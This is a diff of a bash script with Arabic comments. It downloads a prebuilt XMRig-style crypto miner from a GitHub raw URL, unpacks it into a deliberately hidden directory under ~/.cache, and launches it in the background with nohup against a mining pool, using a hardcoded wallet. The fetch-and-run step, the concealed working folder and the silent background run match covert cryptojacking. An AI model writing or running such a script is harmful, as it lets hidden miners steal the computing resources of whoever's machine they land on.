@@ -1,33 +1,20 @@
 #!/bin/bash
 
+# إعداد بيانات المحفظة والمعدّن
+WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
+WORKER="workspace"
+POOL="ghostrider.eu.mine.zergpool.com:5354"
+THREADS=2
 # مجلد العمل
-mkdir -p $HOME/.scala && cd $HOME/.scala
+WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
+mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
-# تحميل xmrig جاهز
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz
+# تحميل النسخة الجاهزة من XMRig (Linux x64)
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
 
 # فك الضغط
-tar -xf scala.tar.gz && cd scala
+tar -xvf scala.tar.gz --strip=1
+rm scala.tar.gz
 
-# إنشاء إعدادات التعدين باستخدام TLS
-cat > config.json <<EOF
-{
-    "autosave": true,
-    "cpu": true,
-    "cpu": {
-        "enabled": true,
-        "threads": [
-            { "index": 0 },
-            { "index": 1 },
-    "randomx": { "1gb-pages": false },
-    "pools": [
-        {
-            "url": "152.53.121.6:443",
-            "user": "4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR",
-            "pass": "worker1",
-            "keepalive": true,
-            "tls": true
-        }
-    ]
-}
-EOF
+# تشغيل المعدّن في الخلفية باستخدام nohup
+nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
